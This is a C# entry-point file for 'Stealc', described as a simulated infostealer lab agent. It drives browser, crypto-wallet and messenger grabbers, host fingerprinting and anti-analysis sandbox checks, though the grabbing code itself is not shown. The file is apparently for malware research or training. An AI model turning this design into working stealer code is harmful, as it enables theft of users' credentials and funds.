using Stealc.Grabber.Core;
using Stealc.Grabber.Grabbers;

namespace Stealc.Agent;

internal static class Program
{
    private static int Main(string[] args)
    {
        if (args.Length == 0) { PrintHelp(); return 0; }

        return args[0].ToLowerInvariant() switch
        {
            "harvest" => Harvest(),
            "scan" => Scan(),
            "status" => Status(),
            "anti" => AntiCheck(),
            _ => Unknown(args[0])
        };
    }

    private static int Harvest()
    {
        var anti = new AntiAnalysis().Check();
        if (anti.IsSuspicious)
        {
            Console.WriteLine($"[!] sandbox flags: {string.Join(", ", anti.Flags)}");
            Console.WriteLine("[!] aborting (lab safety)");
            return 2;
        }

        var pipeline = new Pipeline(labMode: true);
        var result = pipeline.Run();
        Console.WriteLine($"fingerprint: {result.Fingerprint}");
        Console.WriteLine($"browsers:    {result.BrowsersScanned}");
        Console.WriteLine($"wallets:     {result.WalletsScanned}");
        Console.WriteLine($"messengers:  {result.MessengersScanned}");
        Console.WriteLine($"findings:    {result.TotalFound}");
        Console.WriteLine();
        Console.Write(result.LogJson);
        return 0;
    }

    private static int Scan()
    {
        var b = new BrowserGrabber(true);
        var w = new WalletGrabber(true);
        var m = new MessengerGrabber(true);
        Console.WriteLine($"browser targets: {b.TotalTargets}");
        Console.WriteLine($"wallet targets:  {w.TotalTargets}");
        Console.WriteLine($"messenger targets: {m.Scan().Count}");
        foreach (var p in b.Scan())
            Console.WriteLine($"  [{(p.Found ? "+" : "-")}] {p.BrowserName} ({p.Engine})");
        return 0;
    }

    private static int Status()
    {
        var sys = new SystemInfo();
        Console.WriteLine($"host:   {sys.Hostname}");
        Console.WriteLine($"user:   {sys.Username}");
        Console.WriteLine($"os:     {sys.OsVersion}");
        Console.WriteLine($"hwid:   {sys.Hwid}");
        Console.WriteLine($"locale: {sys.Locale}");
        return 0;
    }

    private static int AntiCheck()
    {
        var report = new AntiAnalysis().Check();
        Console.WriteLine($"suspicious: {report.IsSuspicious}");
        foreach (var f in report.Flags) Console.WriteLine($"  flag: {f}");
        return 0;
    }

    private static int Unknown(string cmd) { Console.Error.WriteLine($"unknown: {cmd}"); PrintHelp(); return 1; }
    private static void PrintHelp() => Console.WriteLine(@"stealc — infostealer lab agent (simulated I/O)

  harvest   Run full pipeline (lab mode)
  scan      Enumerate target paths
  status    System info
  anti      Anti-analysis check
");
}
